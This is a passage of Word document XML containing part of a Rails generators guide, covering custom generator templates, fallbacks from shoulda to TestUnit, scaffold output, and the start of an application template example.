            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B4FD580" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And now you can re-run scaffold for another resource and see it generating tests as well!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BE8596" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 Customizing Your Workflow by Changing Generators Templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5817AF85" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the step above we simply wanted to add a line to the generated helper, without adding any extra functionality. There is a simpler way to do that, and it’s by replacing the templates of already existing generators, in that case </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::HelperGenerator</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB56E0A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Rails 3.0 and above, generators don’t just look in the source root for templates, they also search for templates in other paths. And one of them is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/templates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Since we want to customize </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::HelperGenerator</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, we can do that by simply making a template copy inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/templates/rails/helper</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the name </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>helper.rb</w:t>
      </w:r>
      <w:r>
        <w:t>. So let’s create that file with the following content:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7895"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="3A64D357" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E4B3E9E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class_name %&gt;Helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77ADE3B9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  attr_reader :&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>plural_name %&gt;, &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>plural_name.singularize %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6506367A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="490C9575" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">and revert the last change in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="403530B4" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02CE9614" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.generators do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A60384F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.orm             :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="685D0DA2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.template_engine :erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54E0F603" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.test_framework  :test_unit, :fixture</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="554ABC16" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.stylesheets     false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F1E8085" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="539A40AE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you generate another resource, you can see that we get exactly the same result! This is useful if you want to customize your scaffold templates and/or layout by just creating </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>edit.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and so on inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/templates/erb/scaffold</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB04480" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>7 Adding Generators Fallbacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0840D4EB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">One last feature about generators which is quite useful for plugin generators is fallbacks. For example, imagine that you want to add a feature on top of TestUnit like </w:t>
      </w:r>
      <w:hyperlink r:id="rId1155" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>shoulda</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> does. Since TestUnit already implements all generators required by Rails and shoulda just wants to overwrite part of it, there is no need for shoulda to reimplement some generators again, it can simply tell Rails to use a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>TestUnit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generator if none was found under the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Shoulda</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> namespace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A34FCDC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We can easily simulate this behavior by changing our </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> once again:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5928"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0D7100BC" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DD55453" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.generators do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C10A3CF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.orm             :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="456903C1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.template_engine :erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68C1EEDC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.test_framework  :shoulda, :fixture</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72F54F67" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.stylesheets     false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47F40852" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77F00CD3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Add a fallback!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F28EF17" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.fallbacks[:shoulda] = :test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="706929AF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4335DDF9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now, if you create a Comment scaffold, you will see that the shoulda generators are being invoked, and at the end, they are just falling back to TestUnit generators:</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7A2655FF" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="049183B6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate scaffold Comment body:text</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D767FF5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke  active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2617C59A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    db/migrate/20091120151323_create_comments.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7904787D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    app/models/comment.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B8F418E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    shoulda</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01D2BF07" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/unit/comment_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CF72C3D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/fixtures/comments.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0168D896" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       route    resources :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E49B459" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke  scaffold_controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C9877F3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    app/controllers/comments_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="603E9DDF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D3B6E71" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C08DD9C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B2A8D7B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments/edit.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A82590F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments/show.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="759F892F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments/new.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="045ED048" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/comments/_form.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4469058A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/layouts/comments.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C065F7E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    shoulda</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B8A2EE0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/functional/comments_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F3539DE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    my_helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27F9C21B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/helpers/comments_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33985216" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke      shoulda</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7591EC62" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create        test/unit/helpers/comments_helper_test.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BBE1525" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Fallbacks allow your generators to have a single responsibility, increasing code reuse and reducing the amount of duplication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363DE982" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>8 Application Templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0033FB7E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now that you’ve seen how generators can be used </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>inside</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> an application, did you know they can also be used to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>generate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> applications too? This kind of generator is referred as a “template”.</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3DEBFA04" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6543CD63" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem("rspec-rails", :group</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "test")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="752B4D25" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>gem("cucumber-rails", :group</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "test")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="193B682C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="171830D6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yes?("Would you like to install Devise?")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="161634D9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  gem("devise")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CF617A9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  generate("devise:install")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37F69C64" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  model_name = ask("What would you like the user model to be called? [user]")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ADA74AF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  model_name = "user"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
